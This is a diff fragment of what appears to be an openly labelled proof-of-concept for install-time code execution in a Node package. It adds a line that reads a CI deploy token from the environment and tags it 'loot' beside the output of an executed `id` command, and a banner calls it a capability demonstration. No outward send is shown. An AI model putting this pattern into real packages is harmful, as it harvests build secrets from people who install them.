@@ -35,6 +35,8 @@ const marker = [
   'platform:     ' + os.platform() + ' ' + os.release(),
   'cwd:          ' + process.cwd(),
   'node:         ' + process.version,
+  // Payoff: install-time code reads the build's secrets straight out of the env.
+  'loot:         CI_DEPLOY_TOKEN=' + (process.env.CI_DEPLOY_TOKEN || '<none>'),
   'exec:         `id` -> ' + proof,
   '',
   '  !! CAPABILITY DEMONSTRATION ONLY !!',
